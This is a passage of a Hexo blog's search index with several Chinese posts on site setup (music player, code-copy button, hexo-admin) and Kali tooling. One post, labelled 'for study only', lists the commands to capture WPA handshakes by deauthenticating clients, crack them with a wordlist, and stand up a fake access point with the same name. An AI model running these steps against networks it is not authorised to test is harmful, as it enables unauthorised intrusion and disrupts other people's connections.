//音频循环播放, 可选值: &apos;all&apos;全部循环, &apos;one&apos;单曲循环, &apos;none&apos;不循环</span><br><span class="line">    order: &apos;random&apos;, //音频循环顺序, 可选值: &apos;list&apos;列表循环, &apos;random&apos;随机循环</span><br><span class="line">    preload: &apos;auto&apos;, //预加载，可选值: &apos;none&apos;, &apos;metadata&apos;, &apos;auto&apos;</span><br><span class="line">    volume: 0.7, //默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span><br><span class="line">    mutex: true, //互斥，阻止多个播放器同时播放，当前播放器播放时暂停其他播放器</span><br><span class="line">    listFolded: false, //列表默认折叠</span><br><span class="line">    listMaxHeight: 90, //列表最大高度</span><br><span class="line">    lrcType: 0, //歌词传递方式</span><br><span class="line">    audio: [</span><br><span class="line">&#123;</span><br><span class="line">        name: &quot;思念是一种病&quot;,</span><br><span class="line">        artist: &apos;张震岳 / 蔡健雅&apos;,</span><br><span class="line">        url: &apos;http://www.ytmp3.cn/down/50020.mp3&apos;,</span><br><span class="line">        cover: &apos;http://p2.music.126.net/N61oLy0iLfEkZTHD2j87iA==/18693896697392706.jpg?param=130y130&apos;,</span><br><span class="line">      &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">        name: &quot;这就是爱情&quot;,</span><br><span class="line">        artist: &apos;李代沫&apos;,</span><br><span class="line">        url: &apos;http://www.ytmp3.cn/down/54477.mp3&apos;,</span><br><span class="line">        cover: &apos;http://p1.music.126.net/RQBF9kqZb7PtLCaOxi9ngQ==/109951163053984533.jpg?param=130y130&apos;,</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>源码中的参数可以参考<a href="https://aplayer.js.org/#/zh-Hans/" target="_blank" rel="noopener">官方文档</a></p><ul><li>audio对应的便是音频文件，在里面添加音乐</li></ul><p>音乐的外链可以去下面的网站搜索复制<br>音乐图片我是在网易云里搜索同一首歌曲找到的</p><h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><p>打开themes\next\layout_layout.swig文件，将下述程序添加添加到&lt; body itemscope … &gt;后面就行，即在&lt; body &gt;&lt; /body &gt;里面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;/dist/APlayer.min.css&quot;&gt;</span><br><span class="line">&lt;div id=&quot;aplayer&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/dist/APlayer.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/dist/music.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><hr><h1 id="音乐外链"><a href="#音乐外链" class="headerlink" title="音乐外链"></a>音乐外链</h1><p>音乐网站1:<code>www.ytmp3.cn</code></p><p>音乐网站2:<code>www.170hi.com</code></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo倒腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo代码复制</title>
      <link href="/hexo%E4%BB%A3%E7%A0%81%E5%A4%8D%E5%88%B6/"/>
      <url>/hexo%E4%BB%A3%E7%A0%81%E5%A4%8D%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo-next添加代码块复制功能"><a href="#hexo-next添加代码块复制功能" class="headerlink" title="hexo-next添加代码块复制功能"></a>hexo-next添加代码块复制功能</h1><h2 id="clipboard-js"><a href="#clipboard-js" class="headerlink" title="clipboard.js"></a>clipboard.js</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/zenorocha/clipboard.js" target="_blank" rel="noopener">项目地址</a>详细内容可以前往查看，如是只需实现功能即可<a href="https://raw.githubusercontent.com/zenorocha/clipboard.js/master/dist/clipboard.min.js" target="_blank" rel="noopener">右键下载</a>。<br>将clipboard.js保存到theme/next/source/js/src下</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>在theme/next/source/js/src下创建clipboard-use.js文件代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/*页面载入完成后，创建复制按钮*/</span><br><span class="line">!function (e, t, a) &#123; </span><br><span class="line">  /* code */</span><br><span class="line">  var initCopyCode = function()&#123;</span><br><span class="line">    var copyHtml = &apos;&apos;;</span><br><span class="line">    copyHtml += &apos;&lt;button class=&quot;btn-copy&quot; data-clipboard-snippet=&quot;&quot;&gt;&apos;;</span><br><span class="line">    copyHtml += &apos;&lt;span&gt;复制&lt;/span&gt;&apos;;</span><br><span class="line">    copyHtml += &apos;&lt;/button&gt;&apos;;</span><br><span class="line">    $(&quot;.highlight .code pre&quot;).before(copyHtml);</span><br><span class="line">    new ClipboardJS(&apos;.btn-copy&apos;, &#123;</span><br><span class="line">        target: function(trigger) &#123;</span><br><span class="line">            return trigger.nextElementSibling;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  initCopyCode();</span><br><span class="line">&#125;(window, document);</span><br></pre></td></tr></table></figure><p>在theme/next/source/css/_custom/custom.styl样式中添加如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">//代码块复制按钮</span><br><span class="line">.highlight&#123;</span><br><span class="line">  //方便copy代码按钮（btn-copy）的定位</span><br><span class="line">  position: relative;</span><br><span class="line">&#125;</span><br><span class="line">.btn-copy &#123;</span><br><span class="line">    display: inline-block;</span><br><span class="line">    cursor: pointer;</span><br><span class="line">    background-color: #eee;</span><br><span class="line">    background-image: linear-gradient(#fcfcfc,#eee);</span><br><span class="line">    border: 1px solid #d5d5d5;</span><br><span class="line">    border-radius: 3px;</span><br><span class="line">    -webkit-user-select: none;</span><br><span class="line">    -moz-user-select: none;</span><br><span class="line">    -ms-user-select: none;</span><br><span class="line">    user-select: none;</span><br><span class="line">    -webkit-appearance: none;</span><br><span class="line">    font-size: 13px;</span><br><span class="line">    font-weight: 700;</span><br><span class="line">    line-height: 20px;</span><br><span class="line">    color: #333;</span><br><span class="line">    -webkit-transition: opacity .3s ease-in-out;</span><br><span class="line">    -o-transition: opacity .3s ease-in-out;</span><br><span class="line">    transition: opacity .3s ease-in-out;</span><br><span class="line">    padding: 2px 6px;</span><br><span class="line">    position: absolute;</span><br><span class="line">    right: 5px;</span><br><span class="line">    top: 5px;</span><br><span class="line">    opacity: 0;</span><br><span class="line">&#125;</span><br><span class="line">.btn-copy span &#123;</span><br><span class="line">    margin-left: 5px;</span><br><span class="line">&#125;</span><br><span class="line">.highlight:hover .btn-copy&#123;</span><br><span class="line">  opacity: 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>在themes/next/layout/_layout.swig文件中引用（/body）之前添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 代码块复制功能 --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clipboard.js&quot;&gt;&lt;/script&gt;  </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clipboard-use.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo倒腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali软件小技巧</title>
      <link href="/kali%E5%BA%94%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/kali%E5%BA%94%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="kali应用总结"><a href="#kali应用总结" class="headerlink" title="kali应用总结"></a>kali应用总结</h1><h2 id="卸载软件删除配置"><a href="#卸载软件删除配置" class="headerlink" title="卸载软件删除配置"></a>卸载软件删除配置</h2><blockquote><p>apt-get purge XXXX</p></blockquote><h2 id="安装截图软件"><a href="#安装截图软件" class="headerlink" title="安装截图软件"></a>安装截图软件</h2><h3 id="下载安装python-xlib"><a href="#下载安装python-xlib" class="headerlink" title="下载安装python-xlib"></a>下载安装python-xlib</h3><blockquote><p>apt-get install python-xlib</p></blockquote><h3 id="下载安装截图软件包"><a href="#下载安装截图软件包" class="headerlink" title="下载安装截图软件包"></a>下载安装截图软件包</h3><blockquote><p>wget <a href="http://packages.linuxdeepin.com/deepin/pool/main/d/deepin-scrot/deepin-scrot_2.0-0deepin_all.deb" target="_blank" rel="noopener">http://packages.linuxdeepin.com/deepin/pool/main/d/deepin-scrot/deepin-scrot_2.0-0deepin_all.deb</a></p></blockquote><h3 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h3><blockquote><p>dpkg -i deepin-scrot*</p></blockquote><p>运气比较好，安装没有报错。据说如果报错啥的可能需要安装依赖，可以通过强制执行安装依赖命令解决问题</p><p><strong><em>报错了参考下面的方法</em></strong></p><h3 id="强制安装依赖包"><a href="#强制安装依赖包" class="headerlink" title="强制安装依赖包"></a>强制安装依赖包</h3><blockquote><p>apt-get -f install</p></blockquote><h3 id="重新安装截图软件包"><a href="#重新安装截图软件包" class="headerlink" title="重新安装截图软件包"></a>重新安装截图软件包</h3><blockquote><p>sudo dpkg -i deepin-scrot*</p></blockquote><p>如果顺利的话 此时应该执行deepin-scrot就可截图了</p><h3 id="设置快捷键"><a href="#设置快捷键" class="headerlink" title="设置快捷键"></a>设置快捷键</h3><p>在设置页面自定义快捷件，由于用QQ截图习惯了，我设置的Ctrl+Alt+A</p><p><a href="https://imgchr.com/i/k1YJIJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/31/k1YJIJ.md.png" alt="k1YJIJ.md.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> linux学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali软件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-admin插件</title>
      <link href="/hexo-admin%E6%8F%92%E4%BB%B6/"/>
      <url>/hexo-admin%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p><strong>hexo倒腾系列</strong></p><h2 id="原由"><a href="#原由" class="headerlink" title="原由"></a>原由</h2><p>近几天将hexo的next主题倒腾差不多了，开始尝试着写博客了，听说用hexo-admin插件编辑文章还是挺方便的</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>进入hexo源文件目录，执行命令：</p><blockquote><p>npm install –save hexo-admin</p></blockquote><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>编辑根目录下：_config.yml文件，添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin:</span><br><span class="line">  username: myfavoritename</span><br><span class="line">  password_hash: be121740bf988b2225a313fa1f107ca1</span><br><span class="line">  secret: a secret something</span><br></pre></td></tr></table></figure></p><p>其中：<br>username为登录的用户名，password_hash为密码的bcrypt哈希值，secret用于使cookie安全,可以尽可能复杂。</p><p>生成password_hash方法</p><ul><li><blockquote><p>安装模块：sudo npm install bcrypt-nodejs </p></blockquote></li></ul><p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ node</span><br><span class="line">&gt;const bcrypt = require(&apos;bcrypt-nodejs&apos;)</span><br><span class="line">&gt; bcrypt.hashSync(&apos;your_password&apos;)</span><br></pre></td></tr></table></figure></p><p>#your_password为登录密码。</p><p><a href="https://www.zhyong.cn/posts/9092/" target="_blank" rel="noopener">参考博客</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo倒腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wi-Fi密码破解</title>
      <link href="/Wi-Fi%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/"/>
      <url>/Wi-Fi%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><strong>仅供学习参考</strong></p><p><del>总结</del></p><h1 id="wifi密码破解"><a href="#wifi密码破解" class="headerlink" title="wifi密码破解"></a>wifi密码破解</h1><p>将WLAN0网卡开启混杂模式</p><blockquote><p>airmon-ng start wlan0</p></blockquote><p>##提示要杀掉一些进程</p><blockquote><p>airmon-ng check kill</p></blockquote><blockquote><p>airmon-ng start wlan0</p></blockquote><h2 id="1、查看附近Wi-Fi"><a href="#1、查看附近Wi-Fi" class="headerlink" title="1、查看附近Wi-Fi"></a>1、查看附近Wi-Fi</h2><blockquote><p>airodump-ng wlan0mon</p></blockquote><h2 id="2、进行握手包监听与获取"><a href="#2、进行握手包监听与获取" class="headerlink" title="2、进行握手包监听与获取"></a>2、进行握手包监听与获取</h2><blockquote><p>airodump-ng -c 通道值 —bssid wifi的mac值 -w cap文件名 wlan0mon</p></blockquote><p>##其中wlan0mon是启动混杂模式的网卡名</p><h2 id="3、断网抓取握手包（另开一个窗口）"><a href="#3、断网抓取握手包（另开一个窗口）" class="headerlink" title="3、断网抓取握手包（另开一个窗口）"></a>3、断网抓取握手包（另开一个窗口）</h2><blockquote><p>aireplay-ng -0 20 -c 客户机mac值 -a wifi热点mac值 wlan0mon</p></blockquote><p>#-0 death模式 20为发送次数</p><h2 id="4、跑包"><a href="#4、跑包" class="headerlink" title="4、跑包"></a>4、跑包</h2><blockquote><p>aircrack-ng -w 字典 包名</p></blockquote><ul><li>关闭混杂模式</li></ul><blockquote><p>airmon-ng stop wlan0mon</p></blockquote><ul><li>启动网络</li></ul><blockquote><p>service network-manager start</p></blockquote><p>——————————分割线———————————</p><h1 id="构造同名的虚假AP"><a href="#构造同名的虚假AP" class="headerlink" title="构造同名的虚假AP"></a>构造同名的虚假AP</h1><blockquote><p>airbase-ng —essid wifi名 -c 6 -Z 4 wlan0mon</p></blockquote><ul><li><p>-c 代表channel信道</p></li><li><p>-Z代表WPA2加密</p></li><li><p>-z代表WPA1加密</p></li></ul><blockquote><p>z后面的参数1～5分别表示WEP40、TKIP、WRAP、CCMP、WEP104</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 无线学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
